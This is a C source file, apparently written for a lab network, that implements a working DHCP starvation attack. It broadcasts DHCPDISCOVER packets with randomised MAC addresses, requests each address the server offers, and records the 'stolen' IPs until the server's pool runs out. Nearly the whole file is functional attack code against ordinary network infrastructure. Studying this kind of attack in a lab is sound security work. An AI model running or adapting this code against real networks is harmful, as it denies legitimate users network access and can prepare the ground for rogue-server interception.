#include "dhcp_starvation.h"
#include "inaddr_db.h"
#include "libdhcp.h"
#include <arpa/inet.h>
#include <asm-generic/errno-base.h>
#include <asm-generic/errno.h>
#include <asm-generic/socket.h>
#include <bits/types/struct_timeval.h>
#include <errno.h>
#include <netinet/in.h>
#include <sodium.h>
#include <sodium/core.h>
#include <sodium/randombytes.h>
#include <stddef.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

/*
 *  A lot of inspiration was drawn from :
 *  https://github.com/Mingzhen-Huang/DHCP-Client-Server/blob/master/DHCPC.c
 * */

int steal_ip(int fd, struct sockaddr_in server, struct inaddr_db *db) {

  // Building the base DHCP message
  struct dhcp_msg message = {0};
  message.op = BOOTREQUEST;
  message.htype = ETHERNET;
  message.hlen = ETHERNET_LEN;
  randombytes_buf(&message.chaddr, sizeof(u_int8_t) * message.hlen);
  randombytes_buf(&message.xid, sizeof(message.xid));
  message.magic_cookie = DHCP_MAGIC_COOKIE;
  message.flags = htons(0x8000);

  int options_len = 0;
  message.options[options_len] = 0x35;
  message.options[options_len + 1] = 0x01;
  message.options[options_len + 2] = DHCPDISCOVER;
  message.options[options_len + 3] = 0xFF;
  options_len += 3;

  /*============ DHCPDISCOVER =================*/
  message.options[2] = DHCPDISCOVER;
  if (sendto(fd, (char *)&message, sizeof(message), 0,
             (struct sockaddr *)&server, sizeof(struct sockaddr_in)) <= 0) {
    fprintf(stderr, "[!] Could not send DHCP DISCOVER packet : %s\n",
            strerror(errno));
    return -1;
  }

  /*============ RECEIVING THE DHCP OFFER ===========*/
  struct dhcp_msg response = {0};
  int count = 0;
  do {
    int recv_rc = recv(fd, &response, sizeof(struct dhcp_msg), 0);
    if (recv_rc <= 0) {
      int saved_errno = errno;
      if (saved_errno == EAGAIN || saved_errno == EWOULDBLOCK) {
        printf("[+] DHCP server pool exhausted after stealing %zu IPs !\n",
               db->size);
        return 1;
      } else {
        fprintf(stderr, "[!] Failed to read server answer\n");
      }
      return -1;
    }
    count++;
  } while (count < MAX_OFFER_ITER && response.xid != message.xid);
  if (response.xid != message.xid) {
    fprintf(stderr, "Server did not answer with the DHCP OFFER ! It is either "
                    "overbook or ignoring us\n");
    return -1;
  }

  /*=========== SENDING DHCP REQUEST ============*/

  // Setting the request type correctly
  message.options[2] = DHCPREQUEST;

  // Grabbing the server identifier
  int i = 0;
  for (; i < DHCP_MAX_OPTIONS_SIZE && response.options[i] != 255 &&
         response.options[i] != 54;
       i++)
    ;

  if (response.options[i] != 54) {
    fprintf(stderr, "[!] Server did not send a server identifier !\n");
    return -1;
  }
  u_int32_t server_addrlen = response.options[i + 1];
  message.options[options_len] = 0x36;
  message.options[options_len + 1] = server_addrlen;
  memcpy(&message.options[options_len + 2], &response.options[i + 2],
         server_addrlen);
  options_len += 2 + sizeof(u_int32_t);

  // Grabbing the offered IP and requesting it
  u_int32_t offered_ip = response.yiaddr;
  message.options[options_len] = 0x32;
  message.options[options_len + 1] = 4;
  memcpy(&message.options[options_len + 2], &offered_ip, sizeof(u_int32_t));

  options_len += 2 + sizeof(u_int32_t);

  message.options[options_len] = 0xFF;

  if (sendto(fd, (char *)&message, sizeof(struct dhcp_msg), 0,
             (struct sockaddr *)&server, sizeof(struct sockaddr_in)) <= 0) {
    fprintf(stderr, "[!] Failed to send DHCP REQUEST !\n");
    return -1;
  }

  if (push(offered_ip, db) == -1) {
    fprintf(stderr, "[!] Unable to save stolen IP !");
    return -1;
  }
  printf("[+] Stolen IP added to database\n");

  return 0;
}

int starvation(struct inaddr_db *db) {

  // Creating socket and binding it to port 68 on 0.0.0.0
  int sfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if (sfd == -1) {
    perror("socket");
    fprintf(stderr, "[!] Error while opening socket");
    return -1;
  }
  struct sockaddr_in client = {0};
  client.sin_port = htons(68);
  if (inet_pton(AF_INET, "0.0.0.0", &client.sin_addr.s_addr) == -1) {
    fprintf(stderr, "[!] Unable to parse listening address.\n");
    return -1;
  }
  client.sin_family = AF_INET;
  if (bind(sfd, (struct sockaddr *)&client, sizeof(struct sockaddr_in)) == -1) {
    fprintf(stderr, "[!] Failed to bind listening to port 68 ! Might be a "
                    "permission issue\n");
    perror("bind");
    close(sfd);
    return -1;
  }

  // Setting up timeout detection : it is the only way for our program to know
  // when the attack was successful
  struct timeval tv = {.tv_sec = 5, .tv_usec = 0};
  if (setsockopt(sfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) == -1) {
    fprintf(stderr, "[!] Could not set timeout on socket !\n");
    return -1;
  }

  // Setup broadcast
  int broadcast = 1;
  if (setsockopt(sfd, SOL_SOCKET, SO_BROADCAST, &broadcast,
                 sizeof(broadcast)) == -1) {
    fprintf(stderr, "[!] Failed to enable broadcast: %s\n", strerror(errno));
    close(sfd);
    return -1;
  }

  // Binding to specific interface
  const char *iface = "ceth-lab-att";
  if (setsockopt(sfd, SOL_SOCKET, SO_BINDTODEVICE, iface, strlen(iface)) ==
      -1) {
    fprintf(stderr, "[!] Failed to bind to interface: %s\n", strerror(errno));
    close(sfd);
    return -1;
  }

  if (sodium_init() == -1) {
    fprintf(stderr, "[!] Failed to initialize libsodium for MAC randomization. "
                    "DHCP starvation aborted.\n");
    close(sfd);
    return -1;
  }

  struct sockaddr_in server = {0};
  server.sin_port = htons(67);
  server.sin_family = AF_INET;
  inet_pton(AF_INET, BROADCAST_STRADDR, &server.sin_addr.s_addr);

  int i = 0;
  while (i < (int)db->capacity && steal_ip(sfd, server, db) < 1) {
    i++;
  }

  close(sfd);
  return 0;
}
